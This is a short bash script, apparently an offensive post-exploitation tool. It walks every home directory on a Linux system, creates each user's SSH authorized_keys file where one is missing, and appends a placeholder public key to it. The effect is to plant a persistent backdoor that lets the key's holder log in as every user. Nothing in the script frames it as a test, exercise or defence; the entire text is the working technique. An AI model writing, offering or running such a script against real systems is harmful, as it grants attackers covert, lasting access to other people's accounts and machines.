#!/bin/bash
key="PUBLIC_KEY"

for user in $(ls /home/)
do
  if test -f "/home/$user/.ssh/authorized_keys";
  then
    echo "[+] File found on user $user/.ssh/";
  else
    echo "[*] Creating file on user $user/.ssh/";
    echo " " > /home/$user/.ssh/authorized_keys;
  fi
  echo -n $key >> /home/$user/.ssh/authorized_keys;
done;
echo "Done."
